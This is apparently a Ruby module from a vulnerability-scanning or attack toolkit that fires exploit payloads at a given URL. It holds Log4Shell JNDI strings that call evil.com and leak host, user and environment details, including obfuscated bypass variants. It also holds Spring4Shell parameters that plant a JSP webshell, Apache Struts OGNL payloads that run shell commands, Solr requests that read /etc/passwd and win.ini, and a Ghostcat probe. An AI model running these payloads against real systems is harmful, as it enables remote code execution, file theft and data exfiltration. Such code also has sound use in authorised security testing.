require 'uri'
require 'net/http'
require 'base64'
require_relative '../utils/network'
require_relative '../utils/colorize'

class ZeroDay
  def self.test_log4j(url, parameter = 'input')
    log4j_payloads = [
      '${jndi:ldap://evil.com/a}',
      '${jndi:ldap://${hostName}.evil.com/a}',
      '${jndi:ldap://${sys:java.version}.evil.com/a}',
      '${jndi:ldap://${sys:user.name}.evil.com/a}',
      '${jndi:ldap://${env:USER}.evil.com/a}',
      '${jndi:ldap://${date:MM-dd-yyyy}.evil.com/a}',
      '${jndi:ldap://${java:version}.evil.com/a}',
      '${jndi:ldap://${java:os}.evil.com/a}',
      '${jndi:ldap://${java:runtime}.evil.com/a}',
      '${jndi:ldap://${java:vm}.evil.com/a}',
      '${jndi:ldap://${java:classpath}.evil.com/a}',
      '${jndi:ldap://${lower:${upper:test}}.evil.com/a}',
      '${jndi:ldap://${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://evil.com/a}',
      '${jndi:ldap://${base64:ZXZpbC5jb20=}/a}',
      '${jndi:ldap://${lower:${upper:EVIL}}.com/a}',
      '${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://evil.com/a}',
      '${${::-j}ndi:rmi://evil.com/a}',
      '${jndi:rmi://evil.com/a}',
      '${jndi:dns://evil.com/a}',
      '${jndi:nis://evil.com/a}',
      '${jndi:nds://evil.com/a}',
      '${jndi:corba://evil.com/a}',
      '${jndi:iiop://evil.com/a}'
    ]
    
    results = []
    
    log4j_payloads.each do |payload|
      begin
        test_url = url.include?('?') ? "#{url}&#{parameter}=#{URI.encode_www_form_component(payload)}" : "#{url}?#{parameter}=#{URI.encode_www_form_component(payload)}"
        response = Network.http_request(test_url)
        
        if response && response.code.to_i != 500
          puts Colorize.yellow("Testing Log4j: #{payload}")
          results << { payload: payload, tested: true }
        end
      rescue => e
      end
    end
    
    results
  end

  def self.test_spring4shell(url)
    spring_payloads = [
      'class.module.classLoader.DefaultAssertionStatus',
      'class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp',
      'class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT',
      'class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar',
      'class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat='
    ]
    
    results = []
    
    spring_payloads.each do |payload|
      begin
        uri = URI(url)
        http = Net::HTTP.new(uri.host, uri.port)
        http.use_ssl = uri.scheme == 'https'
        http.verify_mode = OpenSSL::SSL::VERIFY_NONE if http.use_ssl
        
        req = Net::HTTP::Post.new(uri.path)
        req['Content-Type'] = 'application/x-www-form-urlencoded'
        req.body = payload
        
        res = http.request(req)
        
        if res.code.to_i == 200 || res.code.to_i == 400
          puts Colorize.yellow("Testing Spring4Shell: #{payload}")
          results << { payload: payload, tested: true }
        end
      rescue => e
      end
    end
    
    results
  end

  def self.test_apache_struts(url)
    struts_payloads = [
      '%{(#_=\'multipart/form-data\').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[\'com.opensymphony.xwork2.ActionContext.container\']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=\'id\').(#iswin=(@java.lang.System@getProperty(\'os.name\').toLowerCase().contains(\'win\'))).(#cmds=(#iswin?{\'cmd.exe\',\'/c\',#cmd}:{\'/bin/bash\',\'-c\',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}',
      '%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{\'id\'})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(\'com.opensymphony.xwork2.dispatcher.HttpServletResponse\'),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}'
    ]
    
    results = []
    
    struts_payloads.each do |payload|
      begin
        uri = URI(url)
        http = Net::HTTP.new(uri.host, uri.port)
        http.use_ssl = uri.scheme == 'https'
        http.verify_mode = OpenSSL::SSL::VERIFY_NONE if http.use_ssl
        
        req = Net::HTTP::Post.new(uri.path)
        req['Content-Type'] = 'application/x-www-form-urlencoded'
        req.body = payload
        
        res = http.request(req)
        
        if res.body.include?('uid=') || res.body.include?('gid=')
          puts Colorize.red("Apache Struts RCE possible")
          results << { payload: payload, vulnerable: true }
        end
      rescue => e
      end
    end
    
    results
  end

  def self.test_apache_solr(url)
    solr_payloads = [
      'stream.url=file:///etc/passwd',
      'stream.url=http://evil.com/',
      'stream.url=file:///C:/Windows/win.ini',
      'stream.url=file:///C:/Windows/System32/drivers/etc/hosts'
    ]
    
    results = []
    
    solr_payloads.each do |payload|
      begin
        test_url = "#{url}/solr/admin/cores?action=CREATE&name=test&configSet=_default&stream.url=#{URI.encode_www_form_component(payload)}"
        response = Network.http_request(test_url)
        
        if response && (response.body.include?('root:') || response.body.include?('[boot loader]'))
          puts Colorize.red("Apache Solr SSRF/RCE possible")
          results << { payload: payload, vulnerable: true }
        end
      rescue => e
      end
    end
    
    results
  end

  def self.test_ghostcat(url)
    begin
      uri = URI(url)
      http = Net::HTTP.new(uri.host, uri.port)
      http.use_ssl = uri.scheme == 'https'
      http.verify_mode = OpenSSL::SSL::VERIFY_NONE if http.use_ssl
      
      req = Net::HTTP::Get.new("#{uri.path}/examples/servlets/servlet/SessionExample")
      res = http.request(req)
      
      if res.code.to_i == 200 && res.body.include?('JSESSIONID')
        puts Colorize.red("Ghostcat vulnerability possible")
        return { vulnerable: true }
      end
    rescue => e
    end
    
    { vulnerable: false }
  end
end

